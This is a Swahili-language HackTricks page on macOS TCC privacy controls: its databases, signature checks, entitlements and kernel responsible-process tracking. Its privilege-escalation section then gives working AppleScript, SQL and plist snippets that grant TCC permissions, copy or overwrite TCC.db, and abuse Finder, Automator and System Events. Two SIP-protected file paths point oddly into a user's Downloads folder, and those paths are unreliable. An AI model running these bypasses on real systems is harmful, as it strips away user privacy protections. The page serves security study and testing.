# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Maelezo ya Msingi**

**TCC (Transparency, Consent, and Control)** ni security protocol inayolenga kudhibiti ruhusa za applications. Jukumu lake kuu ni kulinda vipengele nyeti kama vile **location services, contacts, photos, microphone, camera, accessibility, na full disk access**. Kwa kuhitaji idhini ya wazi ya mtumiaji kabla ya kutoa access ya application kwenye vipengele hivi, TCC huimarisha privacy na udhibiti wa mtumiaji juu ya data yake.

Watumiaji hukutana na TCC wakati applications zinaomba access ya vipengele vilivyolindwa. Hili huonekana kupitia prompt inayowawezesha watumiaji **kukubali au kukataa access**. Zaidi ya hayo, TCC huruhusu vitendo vya moja kwa moja vya mtumiaji, kama vile **kuburuta na kudondosha files kwenye application**, ili kutoa access kwa files maalum, na kuhakikisha kwamba applications zina access tu kwa vitu vilivyoruhusiwa waziwazi.

![Mfano wa TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** inasimamiwa na **daemon** iliyopo kwenye `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` na kusanidiwa katika `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (ikisajili mach service `com.apple.tccd.system`).

Kuna **user-mode tccd** inayoendesha kwa kila mtumiaji aliyeingia kwenye mfumo, iliyofafanuliwa katika `/System/Library/LaunchAgents/com.apple.tccd.plist`, na kusajili mach services `com.apple.tccd` na `com.apple.usernotifications.delegate.com.apple.tccd`.

Hapa unaweza kuona tccd ikiendesha kama system na kama user:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions **zinarithiwa kutoka kwa** application **mzazi** na **permissions** **hufuatiliwa** kwa kutumia **Bundle ID** na **Developer ID**.

### TCC Databases

Ruhusa za kuruhusu/kukataa huhifadhiwa katika TCC databases:

- Database ya mfumo mzima katika **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Database hii **inalindwa na SIP**, kwa hiyo ni SIP bypass pekee inaweza kuandikia.
- User TCC database **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kwa mapendeleo ya kila user.
- Database hii inalindwa kiasi kwamba ni processes zilizo na TCC privileges za juu, kama Full Disk Access, pekee ndizo zinaweza kuiandikia (lakini hailindwi na SIP).

> [!WARNING]
> Databases zilizotajwa hapo awali pia **zinalindwa na TCC dhidi ya kusomwa**. Kwa hiyo **hutaweza kusoma** TCC database ya user wako wa kawaida isipokuwa ikiwa inasomwa na TCC privileged process.
>
> Hata hivyo, kumbuka kwamba process yenye privileges hizi za juu (kama **FDA** au **`kTCCServiceEndpointSecurityClient`**) itaweza kuandikia TCC database ya users

- Kuna **TCC database ya tatu** katika **`/var/db/locationd/clients.plist`** inayoonyesha clients walioruhusiwa **kufikia location services**.
- Faili iliyolindwa na SIP **`/Users/carlospolop/Downloads/REG.db`** (ambayo pia inalindwa dhidi ya kusomwa na TCC), ina **location** za **TCC databases zote halali**.
- Faili iliyolindwa na SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ambayo pia inalindwa dhidi ya kusomwa na TCC), ina TCC granted permissions zaidi.
- Faili iliyolindwa na SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (lakini inaweza kusomwa na mtu yeyote) ni allow list ya applications zinazohitaji TCC exception.

> [!TIP]
> TCC database katika **iOS** iko kwenye **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **notification center UI** inaweza kufanya **mabadiliko katika system TCC database**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Hata hivyo, users wanaweza **kufuta au kuuliza rules** kwa kutumia command line utility ya **`tccutil`**.

#### Query the databases

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Kwa kuchunguza database zote mbili, unaweza kuangalia ruhusa ambazo app imeruhusu, imekataza, au haina (itaomba ruhusa hiyo).

- **`service`** ni uwakilishi wa string wa **permission** ya TCC
- **`client`** ni **bundle ID** au **path to binary** yenye permissions
- **`client_type`** huonyesha ikiwa ni Bundle Identifier(0) au absolute path(1)

<details>

<summary>Jinsi ya kuitekeleza ikiwa ni absolute path</summary>

Tekeleza tu **`launctl load you_bin.plist`**, ukiwa na plist kama hii:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** inaweza kuwa na thamani tofauti: denied(0), unknown(1), allowed(2), au limited(3).
- **`auth_reason`** inaweza kuwa na thamani zifuatazo: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Sehemu ya **csreq** inaonyesha jinsi ya kuthibitisha binary itakayotekelezwa na kuipa ruhusa za TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Kwa maelezo zaidi kuhusu **sehemu nyingine za** jedwali [**angalia chapisho hili la blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Unaweza pia kuangalia **ruhusa ambazo tayari zimepewa** apps katika `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Watumiaji _wanaweza_ **kufuta au kuuliza rules** kwa kutumia **`tccutil`**.

#### Kuweka upya ruhusa za TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

TCC **database** huhifadhi **Bundle ID** ya App, lakini pia **huhifadhi** **information** kuhusu **signature** ili **kuhakikisha** App inayoomba kutumia permission ndiyo sahihi.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Kwa hivyo, applications nyingine zinazotumia jina na bundle ID hiyo hiyo hazitaweza kufikia permissions zilizopewa apps nyingine.

### Entitlements & TCC Permissions

Apps **hazihitaji tu** **kuomba** na **kupewa access** kwa baadhi ya resources, bali pia zinahitaji **kuwa na entitlements husika**.\
Kwa mfano, **Telegram** ina entitlement `com.apple.security.device.camera` ya kuomba **access kwa camera**. **App** ambayo **haina** **entitlement** hii **haitaweza** kufikia camera (na mtumiaji hataulizwa kuhusu permissions).

Kumbuka kwamba entitlements ni plist files na ni sehemu ya code sig, kisha huhashiwa zaidi katika code sig kupitia slots maalum, na zinaweza kuulizwa kwenye kernel na kernel code au na user model code kwa kutumia `csops(#169)` au `csops_audittoken(#170)`.

Hata hivyo, ili apps ziweze **kufikia** **folders fulani za mtumiaji**, kama vile `~/Desktop`, `~/Downloads` na `~/Documents`, **hazihitaji** kuwa na **entitlements** maalum. Mfumo utashughulikia access kwa uwazi na **kumuuliza mtumiaji** inapohitajika.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apps za Apple **hazitazalisha prompts**. Zina **haki zilizopewa awali** katika orodha yao ya **entitlements**, kumaanisha kwamba **hazitawahi kuzalisha popup**, wala hazitaonekana katika **TCC databases** yoyote. Kwa mfano:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Hii itazuia Calendar kumuuliza mtumiaji access ya reminders, calendar na address book.

> [!TIP]
> Mbali na baadhi ya documentation rasmi kuhusu entitlements, inawezekana pia kupata **interesting information kuhusu entitlements katika** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Baadhi ya TCC permissions ni: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hakuna public list inayofafanua zote, lakini unaweza kuangalia [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Maeneo nyeti yasiyolindwa

- $HOME (yenyewe)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### User Intent / com.apple.macl

Kama ilivyotajwa hapo awali, inawezekana **kuipa App access kwa file kwa kuliburuta na kulidondosha kwake**. Access hii haitawekwa katika TCC database yoyote, bali kama **extended** **attribute ya file**. Attribute hii **itahifadhi UUID** ya app iliyoruhusiwa:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Inashangaza kwamba attribute ya **`com.apple.macl`** inasimamiwa na **Sandbox**, si tccd.
>
> Pia kumbuka kwamba ukihamisha faili inayoruhusu UUID ya app kwenye kompyuta yako kwenda kwenye kompyuta nyingine, kwa sababu app hiyo hiyo itakuwa na UID tofauti, haitatoa ufikiaji kwa app hiyo.

Extended attribute `com.apple.macl` **haiwezi kufutwa** kama extended attributes nyingine kwa sababu **inalindwa na SIP**. Hata hivyo, kama [**ilivyoelezwa kwenye post hii**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), inawezekana kuizima kwa **kuzip** faili, **kuifuta**, kisha **ku-unzip**.<sup>[[3]](#references)</sup>






## Mechanism ya Responsible Process ya XNU

Katika macOS/iOS, mechanism ya **responsible process** ni kipengele muhimu cha usalama kinachotumiwa na framework ya **TCC (Transparency, Consent, and Control)** na mifumo mingine ya usalama kufuatilia ni process gani inawajibika hatimaye kwa kitendo fulani, hata kupitia minyororo ya child processes.

TCC inapokagua permissions (kwa mfano, camera, microphone, location), si kila mara hukagua process ya moja kwa moja inayotuma ombi. Badala yake, hukagua **responsible process** - kwa kawaida GUI application iliyoanzisha kitendo hicho, hata kama ombi halisi linatoka kwa helper process au daemon.

<details>
<summary>Jinsi Responsible Process Inavyowekwa</summary>

### Sehemu za Muundo wa Process

Kila process katika XNU hudumisha vitambulisho viwili muhimu vya UUID:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: UUID ya mchakato wenyewe (kutoka kwenye load command ya `LC_UUID` ya binary yake ya Mach-O)
- **`p_responsible_pid`**: PID ya mchakato husika
- **`p_responsible_uuid`**: UUID ya mchakato husika (hubaki hata baada ya mchakato huo kutoka)

### Jinsi Mchakato Husika Unavyowekwa

1. **Wakati wa Kuunda Mchakato (Fork)**

Mchakato mpya unapoundwa kupitia `fork()` au `posix_spawn()`, mchakato husika hurithiwa kutoka kwa parent (syscall ya `exec()` hutumia tena muundo wa `proc` uliopo, kwa hivyo hatua hii hairudiwi hapo):

**Location**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Mambo Muhimu:**
- Michakato ya watoto **hurithi** `p_responsible_pid` ya mzazi
- Hii huunda **mnyororo wa uwajibikaji** kupitia ngazi ya michakato
- Mchakato unaowajibika kwa kawaida huelekeza kwenye programu asili ya GUI

2. **Kazi Kuu: `proc_set_responsible_pid()`**

**Mahali**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Kazi hii hufanya nini:**
1. **Huweka PID inayohusika** katika mchakato lengwa
2. **Hutafuta mchakato unaohusika** kwa kutumia `proc_find()` (huongeza reference count)
3. **Hunakili UUID** kutoka `p_uuid` ya mchakato unaohusika hadi `p_responsible_uuid` ya mchakato lengwa
4. **Huachilia reference** kwa kutumia `proc_rele()` (hupunguza reference count)

3. **Kwa nini Kuhifadhi PID na UUID Zote?**

Mbinu ya kuhifadhi taarifa hizi mbili hutatua tatizo muhimu:

| Field | Purpose | Problem | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | Utafutaji wa haraka wa mchakato wa sasa | PID inaweza kutumika tena baada ya mchakato kutoka | Hutumika kwa utafutaji wa mchakato unaotumika |
| `p_responsible_uuid` | Utambulisho unaodumu | Hubaki baada ya mchakato kukoma | Hutumika kwa ukaguzi wa usalama na auditing |

**Tatizo**: Ikiwa mchakato unaohusika utatoka kabla ya child, PID inaweza kutolewa tena na kupewa mchakato tofauti kabisa.

**Suluhisho**: UUID haibadiliki na hutambulisha kwa njia ya kipekee binary mahususi iliyohusika, hata baada ya mchakato huo kutoka.

### Mtiririko wa Uundaji wa Mchakato
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Chanzo cha UUID: Amri ya Load ya LC_UUID

UUID iliyohifadhiwa katika `p_uuid` hutoka kwenye **amri ya Load ya `LC_UUID` ya executable ya Mach-O**:

1. **Wakati wa Compilation**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Muda wa Utekelezaji**

**Mahali**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Imehifadhiwa katika Muundo wa Process**

**Location**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Mahali**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Ingiza kwenye TCC

Ikiwa wakati fulani utaweza kupata ufikiaji wa kuandika kwenye database ya TCC, unaweza kutumia kitu kama hiki kuongeza entry (ondoa comments):

<details>

<summary>Mfano wa kuingiza kwenye TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Ikiwa umefanikiwa kuingia ndani ya app yenye baadhi ya ruhusa za TCC, angalia ukurasa ufuatao wenye TCC payloads ili kuzitumia vibaya:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Jifunze kuhusu Apple Events katika:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Jina la TCC la ruhusa ya Automation ni: **`kTCCServiceAppleEvents`**\
Ruhusa hii mahususi ya TCC pia huonyesha **application inayoweza kudhibitiwa** ndani ya database ya TCC (hivyo ruhusa hiyo hairuhusu kudhibiti kila kitu).

**Finder** ni application ambayo **daima ina FDA** (hata kama haionekani kwenye UI), kwa hivyo ikiwa una privileges za **Automation** juu yake, unaweza kutumia vibaya privileges zake ili **kuifanya ifanye actions fulani**.\
Katika hali hii app yako ingehitaji ruhusa **`kTCCServiceAppleEvents`** juu ya **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Unaweza kutumia hili **kuandika database yako ya TCC ya user**.

> [!WARNING]
> Ukiwa na ruhusa hii utaweza **kuiomba Finder ifikie folders zilizozuiwa na TCC** na ikupe files, lakini afaik **hutaweza kuifanya Finder itekeleze arbitrary code** ili kutumia kikamilifu access yake ya FDA.
>
> Kwa hiyo, hutaweza kutumia vibaya uwezo kamili wa FDA.

Hii ni TCC prompt ya kupata Automation privileges juu ya Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Kumbuka kwamba kwa sababu app ya **Automator** ina TCC permission **`kTCCServiceAppleEvents`**, inaweza **kudhibiti app yoyote**, kama Finder. Kwa hiyo, ukiwa na permission ya kudhibiti Automator unaweza pia kudhibiti **Finder** kwa code kama iliyo hapa chini:

<details>

<summary>Pata shell ndani ya Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Hali hiyo hiyo hutokea kwa **Script Editor app,** inaweza kudhibiti Finder, lakini kwa kutumia AppleScript huwezi kuilazimisha itekeleze script.

### Automation (SE) kwa baadhi ya TCC

**System Events inaweza kuunda Folder Actions, na Folder Actions zinaweza kufikia baadhi ya TCC folders** (Desktop, Documents & Downloads), hivyo script kama ifuatayo inaweza kutumiwa kutumia vibaya tabia hii:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** kwa FDA\*

Automation kwenye **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) huruhusu kutuma **keystrokes** kwa **processes**. Kwa njia hii unaweza kutumia vibaya Finder kubadilisha TCC.db ya mtumiaji au kuipa app yoyote FDA (ingawa huenda ikaombwa password).

Mfano wa Finder kuandika upya TCC.db ya mtumiaji:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` hadi FDA\*

Angalia ukurasa huu kwa [**payloads za kutumia vibaya ruhusa za Accessibility**](macos-tcc-payloads.md#accessibility) ili kufanya privesc hadi FDA\* au kuendesha keylogger, kwa mfano.

### **Endpoint Security Client hadi FDA**

Ikiwa una **`kTCCServiceEndpointSecurityClient`**, una FDA. Mwisho.

### System Policy SysAdmin File hadi FDA

**`kTCCServiceSystemPolicySysAdminFiles`** inaruhusu **kubadilisha** sifa ya **`NFSHomeDirectory`** ya mtumiaji, jambo linalobadilisha folder yake ya nyumbani na hivyo kuruhusu **kukwepa TCC**.

### User TCC DB hadi FDA

Kupata **ruhusa za kuandika** kwenye database ya **user TCC** **huwezi** kujipa ruhusa za **`FDA`**; ni ile iliyo kwenye database ya mfumo pekee inayoweza kutoa ruhusa hizo.

Lakini unaweza **kujipa mwenyewe **`Automation rights to Finder`****, kisha kutumia vibaya technique ya awali ili kufanya escalation hadi FDA\*.

### **FDA hadi ruhusa za TCC**

Jina la **Full Disk Access** katika TCC ni **`kTCCServiceSystemPolicyAllFiles`**

Sidhani kama hii ni privesc halisi, lakini huenda ikawa muhimu: Ikiwa unadhibiti programu yenye FDA, unaweza **kubadilisha database ya TCC ya mtumiaji na kujipa access yoyote**. Hii inaweza kuwa muhimu kama persistence technique iwapo unaweza kupoteza ruhusa zako za FDA.

### **SIP Bypass hadi TCC Bypass**

**Database ya mfumo ya TCC** inalindwa na **SIP**, ndiyo maana ni processes zenye entitlements **zilizoonyeshwa** pekee zitakazoweza kuibadilisha. Kwa hiyo, ikiwa attacker atapata **SIP bypass** kwenye **file** (kuweza kubadilisha file iliyozuiwa na SIP), ataweza:

- **Kuondoa ulinzi** wa database ya TCC na kujipa ruhusa zote za TCC. Kwa mfano, anaweza kutumia vibaya mojawapo ya mafaili haya:
- TCC systems database
- REG.db
- MDMOverrides.plist

Hata hivyo, kuna chaguo jingine la kutumia vibaya **SIP bypass hii ili kukwepa TCC**: file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ni allow list ya applications zinazohitaji TCC exception. Kwa hiyo, ikiwa attacker anaweza **kuondoa ulinzi wa SIP** kutoka kwenye file hii na kuongeza **application yake mwenyewe**, application hiyo itaweza kukwepa TCC.\
Kwa mfano, kuongeza terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
